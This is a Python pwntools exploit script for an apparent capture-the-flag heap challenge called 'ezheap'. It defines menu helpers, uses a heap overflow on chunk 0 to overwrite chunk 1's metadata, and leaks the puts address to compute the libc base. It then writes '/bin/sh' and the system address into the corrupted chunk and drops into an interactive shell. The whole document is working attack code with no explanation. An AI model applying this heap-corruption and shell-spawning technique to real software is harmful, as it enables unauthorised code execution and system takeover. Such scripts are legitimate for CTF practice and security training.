from pwn import *

context(os="linux", arch="amd64", log_level="debug")
io = process("./ezheap")
#io = remote('node5.anna.nssctf.cn', 23338)
#context.gdb_binary = "/bin/pwndbg"

libc = ELF("./libc.so.6")


def edit(index: int, size: int, content: bytes):
    io.recvuntil(b"Choice:")
    io.sendline(b"4")
    io.recvuntil(b"idx:")
    io.sendline(str(index).encode())
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())
    io.send(content)


def add(index: int, size: int, name: bytes, content: bytes):
    io.recvuntil(b"Choice:")
    io.sendline(b"1")
    io.recvuntil(b"idx:")
    io.sendline(str(index).encode())
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())
    io.recvuntil(b"Name:")
    io.sendline(name)
    io.recvuntil(b"Content:")
    io.sendline(content)


def show(index: int):
    io.recvuntil(b"Choice:")
    io.sendline(b"3")
    io.recvuntil(b"idx:")
    io.sendline(str(index).encode())


def delete(index: int):
    io.recvuntil(b"Choice:")
    io.sendline(b"2")
    io.recvuntil(b"idx:")
    io.sendline(str(index).encode())


add(0, 0x10, b"A", b"A")
add(1, 0x10, b"B", b"B")
payload = b'\x00'*0x18 + p64(0x31) + b'\x00'*0x10 + b'\x80'
edit(0, 0x31, payload)
show(1)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))


print("puts address = ", hex(puts_addr))
libcBase = puts_addr - libc.sym["puts"]
print("libc base address = ", hex(libcBase))

system = libcBase + libc.sym["system"]
print("system address = ", hex(system))

payload = p64(0) * 3 + p64(0x31) +b"/bin/sh\x00" +p64(0) * 2 + p64(1) + p64(system)
edit(0, 0x48, payload)
show(1)

io.interactive()
